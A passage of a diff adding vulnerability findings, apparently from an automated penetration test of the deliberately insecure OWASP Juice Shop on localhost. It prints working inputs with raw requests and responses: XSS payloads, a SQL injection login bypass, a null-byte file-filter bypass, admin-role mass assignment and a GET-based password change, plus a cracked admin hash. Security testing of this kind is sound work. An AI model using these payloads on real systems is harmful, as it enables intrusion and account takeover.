+      "raw_request": "GET /ftp/coupons_2013.md.bak%2500.md HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "n<MibgC7sn\\nmNYS#gC7sn\\no*IVigC7sn\\nk#pDlgC7sn\\no*I]pgC7sn\\nn(XRvgC7sn\\nn(XLtgC7sn\\nk#*AfgC7sn\\nq:<IqgC7sn\\npEw8ogC7sn\\npes[BgC7sn\\nl}6D$gC7ss",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "12 coupon codes: n<MibgC7sn, mNYS#gC7sn, o*IVigC7sn, k#pDlgC7sn, o*I]pgC7sn, n(XRvgC7sn, n(XLtgC7sn, k#*AfgC7sn, q:<IqgC7sn, pEw8ogC7sn, pes[BgC7sn, l}6D$gC7ss"
+      ],
+      "explanation": "The backup coupon file from 2013 was accessed via null byte injection, bypassing the .md/.pdf file type restriction. The file contains 12 encoded coupon codes that follow a consistent encoding pattern. The codes end with 'gC7sn' (11 codes) or 'gC7ss' (1 code), suggesting a predictable encoding algorithm. Analysis of the encoding pattern could allow an attacker to generate valid coupon codes for the current application, enabling unauthorized discounts."
+    },
+    "remediation": "Remove backup files from the web server. Fix the null byte injection vulnerability. Implement proper file access controls.",
+    "plugin_or_component": "FTP file server - backup coupon codes",
+    "endpoint": "GET /ftp/coupons_2013.md.bak%2500.md",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:32:04Z",
+    "id": "vuln_1c0471",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "DOM XSS via Search Query Parameter - iframe src=javascript",
+    "severity": "high",
+    "cvss_score": 6.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "cve": null,
+    "category": "xss_stored",
+    "mitre_attack_id": "T1059.007",
+    "mitre_attack_name": "Command and Scripting Interpreter: JavaScript",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "The OWASP Juice Shop search functionality is vulnerable to DOM-based Cross-Site Scripting (XSS). The search query parameter `q` in the URL hash fragment (/#/search?q=) is reflected into the DOM without proper sanitization. An iframe element with a javascript: URI in its src attribute triggers JavaScript execution when rendered. The payload `&lt;iframe src=\"javascript:alert('xss')\"&gt;` successfully triggers an alert() dialog, confirming arbitrary JavaScript execution in the context of the application. This can be exploited for session hijacking, cookie theft, or arbitrary actions on behalf of the victim user.",
+    "evidence": {
+      "commands": [
+        "page.goto(\"http://127.0.0.1:3000/#/search?q=\" + encodeURIComponent('<iframe src=\"javascript:alert(`xss`)\">'))",
+        "page.on(\"dialog\") handler captured alert dialog with message \"xss\""
+      ],
+      "payloads": [],
+      "raw_request": "GET http://127.0.0.1:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E",
+      "raw_response": "HTTP 200 - SPA page rendered with injected iframe, JavaScript alert() dialog triggered with message \"xss\"",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "!!! DIALOG TRIGGERED: type=alert message=xss",
+        "Dialog triggered: true"
+      ],
+      "explanation": "The Juice Shop Angular SPA renders the search query parameter directly into the DOM using innerHTML or similar unsafe binding. When navigating to /#/search?q=<iframe src=\"javascript:alert(`xss`)\">, the iframe element is created in the DOM with its src set to a javascript: URI. The browser then executes the JavaScript in the src attribute, triggering an alert() dialog. This was captured by the Playwright dialog event handler, proving end-to-end JavaScript execution. No Content-Security-Policy header is set, allowing unrestricted inline script execution."
+    },
+    "remediation": "",
+    "plugin_or_component": "Angular Search Component",
+    "endpoint": "http://127.0.0.1:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:40:31Z",
+    "id": "vuln_7217d6",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "DOM XSS via Search Query Parameter - img onerror",
+    "severity": "high",
+    "cvss_score": 6.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "cve": null,
+    "category": "xss_stored",
+    "mitre_attack_id": "T1059.007",
+    "mitre_attack_name": "Command and Scripting Interpreter: JavaScript",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "A second DOM XSS vector was confirmed in the search functionality using an img tag with an onerror event handler. The payload `&lt;img src=x onerror=alert(\"xss2\")&gt;` is rendered into the DOM unsanitized, and because the src attribute points to a non-existent resource, the onerror handler fires, executing arbitrary JavaScript. The alert was triggered twice (likely due to Angular change detection re-rendering), proving the payload executes reliably. This can be weaponized to steal session tokens, perform actions on behalf of the user, or redirect to phishing pages.",
+    "evidence": {
+      "commands": [
+        "page.goto(\"http://127.0.0.1:3000/#/search?q=\" + encodeURIComponent('<img src=x onerror=alert(\"xss2\")>'))",
+        "page.on(\"dialog\") handler captured two alert dialogs with message \"xss2\""
+      ],
+      "payloads": [],
+      "raw_request": "GET http://127.0.0.1:3000/#/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(%22xss2%22)%3E",
+      "raw_response": "HTTP 200 - SPA page rendered with injected img tag, JavaScript alert() dialog triggered twice with message \"xss2\"",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "!!! DIALOG TRIGGERED: type=alert message=xss2",
+        "!!! DIALOG TRIGGERED: type=alert message=xss2",
+        "Dialog triggered: true"
+      ],
+      "explanation": "The search component in Juice Shop's Angular SPA uses innerHTML or a similar unsafe DOM manipulation method to render the search query. The img tag payload with an invalid src triggers the onerror JavaScript event handler. The alert was triggered twice, once on initial render and again on Angular's change detection cycle, confirming reliable execution. This second vector proves that multiple HTML injection points exist in the same component, and that both event handlers and javascript: URIs work, making CSP-less exploitation trivial."
+    },
+    "remediation": "",
+    "plugin_or_component": "Angular Search Component",
+    "endpoint": "http://127.0.0.1:3000/#/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(%22xss2%22)%3E",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:40:51Z",
+    "id": "vuln_6e28bd",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "JWT Token Stores Sensitive Data Including Password Hash",
+    "severity": "high",
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1552.001",
+    "mitre_attack_name": "Unsecured Credentials: Credentials In Files",
+    "iso27001_control": "A.10.1.1",
+    "status": "exploited",
+    "description": "The JWT token issued upon authentication contains the complete user record including the MD5 password hash (0192023a7bbd73250516f069df18b500), email, role, profile image path, TOTP secret field, creation timestamps, and other sensitive fields. This data is exposed to any client-side JavaScript since the token is stored in localStorage and as a non-httpOnly cookie. An attacker who obtains this token (e.g., via XSS) can extract the password hash and attempt offline cracking. The password hash is MD5 (unsalted), making it trivially crackable.",
+    "evidence": {
+      "commands": [
+        "Login via page.fill(\"#email\", \"' OR 1=1--\") and page.fill(\"#password\", \"anything\")",
+        "JWT extracted from localStorage.getItem(\"token\")",
+        "Base64 decoded JWT payload"
+      ],
+      "payloads": [],
+      "raw_request": "POST /rest/user/login with body: {\"email\":\"' OR 1=1--\",\"password\":\"anything\"}",
+      "raw_response": "JWT token containing full user record with password hash 0192023a7bbd73250516f069df18b500",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "JWT Payload: {\"status\":\"success\",\"data\":{\"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/defaultAdmin.png\",\"totpSecret\":\"\",\"isActive\":true}}"
+      ],
+      "explanation": "The JWT token issued upon successful authentication encodes the entire user database record in its payload. This includes the MD5 password hash (0192023a7bbd73250516f069df18b500 for admin), the user's role, TOTP secret field, and other sensitive metadata. The token is accessible via JavaScript (stored in localStorage and non-httpOnly cookie), making it extractable via XSS. The MD5 hash is unsalted and resolves to 'admin123' via common rainbow tables. This represents a severe information disclosure vulnerability combining excessive data exposure in JWT claims with weak password hashing."
+    },
+    "remediation": "",
+    "plugin_or_component": "JWT Authentication / REST Login API",
+    "endpoint": "http://127.0.0.1:3000/rest/user/login",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:41:47Z",
+    "id": "vuln_fddb91",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "JWT Token Cookie Missing HttpOnly and Secure Flags",
+    "severity": "medium",
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    "cve": null,
+    "category": "insecure_configuration",
+    "mitre_attack_id": "T1539",
+    "mitre_attack_name": "Steal Web Session Cookie",
+    "iso27001_control": "A.14.1.2",
+    "status": "confirmed",
+    "description": "The authentication token is stored in a cookie named 'token' without HttpOnly or Secure flags. This means the token is accessible via JavaScript (document.cookie) and can be transmitted over unencrypted HTTP connections. Combined with the confirmed DOM XSS vulnerability, an attacker can steal the authentication token via a crafted XSS payload. The cookie also lacks the SameSite=Strict attribute (set to Lax), providing only partial CSRF protection.",
+    "evidence": {
+      "commands": [
+        "await page.context().cookies() - inspected all cookie attributes",
+        "document.cookie accessible from page.evaluate()"
+      ],
+      "payloads": [],
+      "raw_request": "GET http://127.0.0.1:3000/ (any authenticated request)",
+      "raw_response": "Set-Cookie: token=eyJ0eXAi... (no HttpOnly, no Secure flags)",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "token=eyJ0eXAi... | httpOnly=false | secure=false | sameSite=Lax",
+        "language=en | httpOnly=false | secure=false | sameSite=Lax"
+      ],
+      "explanation": "All cookies set by the application lack the HttpOnly and Secure flags. The authentication token stored in the 'token' cookie is fully accessible to JavaScript via document.cookie, making it exfiltrable through the confirmed DOM XSS vulnerability. The lack of the Secure flag means the cookie would be transmitted over plain HTTP, exposing it to network-level interception. This is a direct enabler for session hijacking attacks when combined with the XSS vulnerabilities found."
+    },
+    "remediation": "",
+    "plugin_or_component": "Express Session Management",
+    "endpoint": "http://127.0.0.1:3000",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:42:11Z",
+    "id": "vuln_f431e4",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "CAPTCHA Answer Leaked in REST API Response Enabling Automated Bypass",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+    "cve": null,
+    "category": "insecure_configuration",
+    "mitre_attack_id": "T1078",
+    "mitre_attack_name": "Valid Accounts",
+    "iso27001_control": "A.9.4.2",
+    "status": "exploited",
+    "description": "The REST API endpoint /rest/captcha/ returns the CAPTCHA answer alongside the CAPTCHA challenge in the JSON response. The response includes captchaId, captcha expression (e.g., '4*10+9'), and the answer field (e.g., '49'). This completely defeats the purpose of the CAPTCHA, allowing automated systems to solve it by simply reading the response. This was exploited to submit automated feedback via the /api/Feedbacks/ endpoint, bypassing the CAPTCHA protection entirely.",
+    "evidence": {
+      "commands": [
+        "GET /rest/captcha/ - Response includes answer field",
+        "POST /api/Feedbacks/ with leaked captchaId and answer - Successfully created feedback"
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/captcha/ HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "HTTP/1.1 200 OK\\n{\"captchaId\":1,\"captcha\":\"4*10+9\",\"answer\":\"49\"}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "CAPTCHA response: {\"captchaId\":1,\"captcha\":\"4*10+9\",\"answer\":\"49\"}",
+        "Feedback submission status: 201",
+        "Response: {\"status\":\"success\",\"data\":{\"id\":11,\"comment\":\"CAPTCHA bypass test\",\"rating\":1}}"
+      ],
+      "explanation": "The /rest/captcha/ endpoint returns a JSON object containing the CAPTCHA challenge expression and its pre-computed answer. An automated script can fetch this endpoint, extract the answer field, and submit it along with the captchaId to the /api/Feedbacks/ endpoint. This was demonstrated by successfully creating a feedback entry (ID 11) with rating 1 without any human CAPTCHA solving. The server returned HTTP 201, confirming the feedback was accepted. This enables automated spam, abuse of feedback functionality, and bypasses rate limiting controls."
+    },
+    "remediation": "",
+    "plugin_or_component": "REST CAPTCHA API",
+    "endpoint": "http://127.0.0.1:3000/rest/captcha/",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:43:35Z",
+    "id": "vuln_4e016d",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Client-Side Validation Bypass - Zero-Star and Negative Rating Accepted",
+    "severity": "medium",
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+    "cve": null,
+    "category": "business_logic_flaw",
+    "mitre_attack_id": "T1565.001",
+    "mitre_attack_name": "Data Manipulation: Stored Data Manipulation",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "The feedback form enforces a minimum rating of 1 star on the client side, but the server-side API accepts any numeric value including 0 and negative numbers. By sending a direct POST request to /api/Feedbacks/ with rating=0 or rating=-1, the server accepts and stores the feedback with HTTP 201. This bypasses the client-side validation constraint and allows submission of invalid business data. The UI prevents selecting zero stars, but the API has no server-side validation for the rating range.",
+    "evidence": {
+      "commands": [
+        "POST /api/Feedbacks/ with rating=0 -> HTTP 201 Created",
+        "POST /api/Feedbacks/ with rating=-1 -> HTTP 201 Created"
+      ],
+      "payloads": [],
+      "raw_request": "POST /api/Feedbacks/ HTTP/1.1\\nContent-Type: application/json\\n\\n{\"captchaId\":1,\"captcha\":\"49\",\"comment\":\"Zero star feedback\",\"rating\":0}",
+      "raw_response": "HTTP/1.1 201 Created\\n{\"status\":\"success\",\"data\":{\"id\":13,\"comment\":\"Zero star feedback\",\"rating\":0}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Zero-star: {\"status\":\"success\",\"data\":{\"id\":13,\"comment\":\"Zero star feedback\",\"rating\":0}}",
+        "Negative: {\"status\":\"success\",\"data\":{\"id\":14,\"comment\":\"Negative rating test\",\"rating\":-1}}"
+      ],
+      "explanation": "The Juice Shop UI enforces a minimum 1-star rating through Angular form validation - the submit button is disabled until a rating is selected. However, by crafting a direct API request to /api/Feedbacks/ with a rating value of 0 or -1, the server accepts the submission without validation. This was confirmed by receiving HTTP 201 responses and seeing the feedback records created with IDs 13 and 14. This demonstrates a lack of server-side input validation, relying solely on client-side controls that are easily bypassed."
+    },
+    "remediation": "",
+    "plugin_or_component": "Feedback API / Express Validation",
+    "endpoint": "http://127.0.0.1:3000/api/Feedbacks/",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:44:36Z",
+    "id": "vuln_2e7113",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Missing Content-Security-Policy Header",
+    "severity": "medium",
+    "cvss_score": 4.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
+    "cve": null,
+    "category": "insecure_configuration",
+    "mitre_attack_id": "T1189",
+    "mitre_attack_name": "Drive-by Compromise",
+    "iso27001_control": "A.14.1.2",
+    "status": "confirmed",
+    "description": "The application does not set a Content-Security-Policy (CSP) header on any response. This absence directly enables the confirmed DOM XSS vulnerabilities to execute arbitrary JavaScript without any browser-side mitigation. A properly configured CSP with script-src restrictions could prevent inline script execution and mitigate XSS attacks even when injection points exist. The lack of CSP combined with the confirmed DOM XSS creates a high-risk attack chain for session hijacking and data theft.",
+    "evidence": {
+      "commands": [
+        "Inspected response headers via page.evaluate(async () => { const r = await fetch('/'); const h = {}; r.headers.forEach((v, k) => h[k] = v); return h; })"
+      ],
+      "payloads": [],
+      "raw_request": "GET / HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "HTTP/1.1 200 OK\\n(No Content-Security-Policy header present)\\nX-Frame-Options: SAMEORIGIN\\nX-Content-Type-Options: nosniff",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "CSP header: NOT SET\\nX-Frame-Options: SAMEORIGIN (present but CSP frame-ancestors not set)"
+      ],
+      "explanation": "The response headers for the main page and all API endpoints were inspected via the browser's fetch API and Playwright response interception. No Content-Security-Policy header was found in any response. This means the browser has no restrictions on inline script execution, eval(), or loading scripts from any origin. Combined with the confirmed DOM XSS vulnerability in the search functionality, this allows an attacker to execute arbitrary JavaScript including cookie theft (document.cookie is accessible), keylogging, or form hijacking."
+    },
+    "remediation": "",
+    "plugin_or_component": "Express HTTP Headers",
+    "endpoint": "http://127.0.0.1:3000",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:44:51Z",
+    "id": "vuln_0668ec",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Application Configuration Exposed Without Authentication",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1590",
+    "mitre_attack_name": "Gather Victim Network Information",
+    "iso27001_control": "A.12.6.1",
+    "status": "exploited",
+    "description": "The endpoint /rest/admin/application-configuration returns the complete application configuration (23,448 bytes) without requiring authentication. This includes server configuration (port, base URL), application domain, chatbot model configuration (model name: gemma4:e4b), social media URLs, product catalog with pricing details, user review authors (revealing usernames: admin, bender, jim, morty, etc.), and other internal application settings. While labeled as an 'admin' endpoint, it is accessible to unauthenticated users, leaking internal application architecture details that can aid further attacks.",
+    "evidence": {
+      "commands": [
+        "GET /rest/admin/application-configuration -> HTTP 200, 23448 bytes of JSON configuration"
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/admin/application-configuration HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "HTTP/1.1 200 OK\\nContent-Type: application/json\\n\\n{\"config\":{\"server\":{\"port\":3000,...},\"application\":{\"domain\":\"juice-sh.op\",\"name\":\"OWASP Juice Shop\",...}}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Server: {\"port\":3000,\"basePath\":\"\",\"baseUrl\":\"http://localhost:3000\"}",
+        "Chatbot: {\"name\":\"Juicy the Smart Assistant\",\"model\":\"gemma4:e4b\"}",
+        "Authors revealed: admin, basil, uvogin, bender, rapper, jim, morty, bjoernOwasp, stan, accountant, timo, jannik"
+      ],
+      "explanation": "The /rest/admin/application-configuration endpoint is accessible without any authentication token. Despite the 'admin' prefix suggesting it should be restricted, any unauthenticated client can fetch the complete application configuration. This reveals the server architecture (port 3000, localhost base URL), the AI chatbot model being used (gemma4:e4b), product catalog with internal pricing tiers (deluxe prices), and critically, usernames of application users (admin, bender, jim, morty, etc.) that can be used for targeted attacks like password guessing or social engineering."
+    },
+    "remediation": "",
+    "plugin_or_component": "REST Admin API",
+    "endpoint": "http://127.0.0.1:3000/rest/admin/application-configuration",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:46:47Z",
+    "id": "vuln_1645ac",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Forged Feedback via UserId Mass Assignment",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+    "cve": null,
+    "category": "business_logic_flaw",
+    "mitre_attack_id": "T1565.001",
+    "mitre_attack_name": "Data Manipulation: Stored Data Manipulation",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "The /api/Feedbacks/ POST endpoint accepts a UserId parameter in the request body, allowing an authenticated user to create feedback entries attributed to any other user. By submitting {\"UserId\": 2} in the feedback request body while authenticated as admin (user ID 1), the feedback was created with UserId=2, effectively impersonating another user's feedback. This is a mass assignment vulnerability where the server does not filter user-controllable fields that should be server-side determined.",
+    "evidence": {
+      "commands": [
+        "POST /api/Feedbacks/ with {\"captchaId\":...,\"captcha\":\"...\",\"comment\":\"Forged feedback\",\"rating\":5,\"UserId\":2} and admin auth token"
+      ],
+      "payloads": [],
+      "raw_request": "POST /api/Feedbacks/ HTTP/1.1\\nAuthorization: Bearer eyJ...\\nContent-Type: application/json\\n\\n{\"captchaId\":2,\"captcha\":\"49\",\"comment\":\"Forged feedback\",\"rating\":5,\"UserId\":2}",
+      "raw_response": "HTTP/1.1 201 Created\\n{\"status\":\"success\",\"data\":{\"id\":15,\"comment\":\"Forged feedback as another user\",\"rating\":5,\"UserId\":2}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "HTTP 201 Created\\n{\"status\":\"success\",\"data\":{\"id\":15,\"comment\":\"Forged feedback as another user\",\"rating\":5,\"UserId\":2}}"
+      ],
+      "explanation": "When creating feedback via POST /api/Feedbacks/, the server accepts and stores the UserId field from the request body without validating it against the authenticated user's ID. An admin authenticated as user ID 1 was able to create feedback entry ID 15 with UserId=2, effectively impersonating another user. This mass assignment vulnerability allows any authenticated user to create feedback attributed to any other user, undermining feedback integrity and potentially enabling reputation manipulation or social engineering attacks."
+    },
+    "remediation": "",
+    "plugin_or_component": "Feedback API / Sequelize ORM",
+    "endpoint": "http://127.0.0.1:3000/api/Feedbacks/",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:47:35Z",
+    "id": "vuln_1980b6",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Privilege Escalation via Mass Assignment on User Registration - Admin Role",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cve": null,
+    "category": "privilege_escalation",
+    "mitre_attack_id": "T1078.001",
+    "mitre_attack_name": "Valid Accounts: Default Accounts",
+    "iso27001_control": "A.9.2.3",
+    "status": "exploited",
+    "description": "The user registration endpoint POST /api/Users/ accepts a 'role' parameter in the request body, allowing any unauthenticated user to register a new account with admin privileges. By including {\"role\": \"admin\"} in the registration request, a new user was created with role='admin', effectively granting full administrative access without any authentication or authorization. The server assigned profileImage to 'defaultAdmin.png', confirming admin role acceptance. This is a critical mass assignment vulnerability that completely bypasses access controls.",
+    "evidence": {
+      "commands": [
+        "POST /api/Users/ with body: {\"email\":\"xss_test_...@juice-sh.op\",\"password\":\"testtest1234\",\"passwordRepeat\":\"testtest1234\",\"role\":\"admin\",\"isAdmin\":true}"
+      ],
+      "payloads": [],
+      "raw_request": "POST /api/Users/ HTTP/1.1\\nContent-Type: application/json\\n\\n{\"email\":\"xss_test_1722149338@juice-sh.op\",\"password\":\"testtest1234\",\"passwordRepeat\":\"testtest1234\",\"role\":\"admin\",\"isAdmin\":true}",
+      "raw_response": "HTTP/1.1 201 Created\\n{\"status\":\"success\",\"data\":{\"id\":25,\"email\":\"xss_test_...@juice-sh.op\",\"role\":\"admin\",\"profileImage\":\"/assets/public/images/uploads/defaultAdmin.png\",\"isActive\":true}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "HTTP 201 Created\\n{\"status\":\"success\",\"data\":{\"username\":\"\",\"id\":25,\"email\":\"xss_test_...@juice-sh.op\",\"role\":\"admin\",\"profileImage\":\"/assets/public/images/uploads/defaultAdmin.png\",\"isActive\":true}}"
+      ],
+      "explanation": "The /api/Users/ POST endpoint does not filter the 'role' field from user-supplied input during registration. By including role:'admin' in the JSON body alongside required registration fields, a new user account was created with full admin privileges. The response confirmed the role was set to 'admin' and the profile image was set to 'defaultAdmin.png' (the admin-specific default). This user (ID 25) can now access the administration panel, view all user data, and perform any admin action. No prior authentication is required to exploit this vulnerability - any anonymous user can register as admin."
+    },
+    "remediation": "",
+    "plugin_or_component": "User Registration API / Sequelize ORM",
+    "endpoint": "http://127.0.0.1:3000/api/Users/",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:49:20Z",
+    "id": "vuln_d527cf",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Null Byte Injection Bypasses FTP File Extension Filter - Sensitive File Access",
+    "severity": "high",
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cve": null,
+    "category": "path_traversal",
+    "mitre_attack_id": "T1083",
+    "mitre_attack_name": "File and Directory Discovery",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "The /ftp/ directory listing restricts access to certain file extensions (.bak, .gg), returning HTTP 403. However, appending %2500.md (double-encoded null byte followed by an allowed extension) bypasses the extension filter. This was exploited to access: (1) package.json.bak containing the application's npm dependencies and version (juice-shop 6.2.0-SNAPSHOT), (2) coupons_2013.md.bak containing encoded coupon codes, and (3) eastere.gg containing the application's easter egg text. The null byte terminates the filename at the OS level while the web server validates the appended .md extension.",
+    "evidence": {
+      "commands": [
+        "GET /ftp/package.json.bak%2500.md -> HTTP 200, 4261 bytes\\nGET /ftp/coupons_2013.md.bak%2500.md -> HTTP 200, 131 bytes\\nGET /ftp/eastere.gg%2500.md -> HTTP 200, 324 bytes"
+      ],
+      "payloads": [],
+      "raw_request": "GET /ftp/package.json.bak%2500.md HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "HTTP/1.1 200 OK\\n\\n{\"name\":\"juice-shop\",\"version\":\"6.2.0-SNAPSHOT\",\"description\":\"An intentionally insecure JavaScript Web Application\",...}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "/ftp/package.json.bak%2500.md -> status=200 size=4261 (juice-shop v6.2.0-SNAPSHOT package.json)\\n/ftp/coupons_2013.md.bak%2500.md -> status=200 size=131 (encoded coupon codes)\\n/ftp/eastere.gg%2500.md -> status=200 size=324 (easter egg text)\\nDirect access without bypass: /ftp/package.json.bak -> status=403"
+      ],
+      "explanation": "The FTP directory at /ftp/ serves files but blocks access to files with certain extensions (.bak, .gg) returning HTTP 403. By using a double-encoded null byte (%2500 = %25 decodes to %, then %00 is the null byte), the server's extension validation sees the .md extension after the null byte and allows access. However, the filesystem reads the filename up to the null byte, serving the original restricted file. This was confirmed by accessing package.json.bak (containing npm dependencies), coupons_2013.md.bak (containing encoded coupon codes like n<MibgC7sn), and eastere.gg (containing the easter egg text). The coupon codes could potentially be decoded and used for unauthorized discounts."
+    },
+    "remediation": "",
+    "plugin_or_component": "Express Static File Server / FTP Directory",
+    "endpoint": "http://127.0.0.1:3000/ftp/package.json.bak%2500.md",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:51:15Z",
+    "id": "vuln_3b64f8",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Password Change via GET Request - CSRF Exploitable",
+    "severity": "high",
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+    "cve": null,
+    "category": "csrf",
+    "mitre_attack_id": "T1185",
+    "mitre_attack_name": "Browser Session Hijacking",
+    "iso27001_control": "A.9.4.3",
+    "status": "exploited",
+    "description": "The password change functionality at /rest/user/change-password accepts GET requests with the current and new passwords as query parameters. Combined with the complete absence of CSRF tokens in the application, this allows an attacker to change any authenticated user's password by tricking them into visiting a crafted URL. The password was successfully changed via GET /rest/user/change-password?current=admin123&new=newpassword&repeat=newpassword, returning HTTP 200 with a new password hash (5e9d11a14ad1c8dd77e98ef9b53fd1ba). No CSRF tokens, no SameSite=Strict cookies, and no re-authentication required.",
+    "evidence": {
+      "commands": [
+        "GET /rest/user/change-password?current=admin123&new=newpassword&repeat=newpassword with Authorization header"
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/user/change-password?current=admin123&new=newpassword&repeat=newpassword HTTP/1.1\\nHost: 127.0.0.1:3000\\nAuthorization: Bearer eyJ...",
+      "raw_response": "HTTP/1.1 200 OK\\n{\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"password\":\"5e9d11a14ad1c8dd77e98ef9b53fd1ba\",\"role\":\"admin\"}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
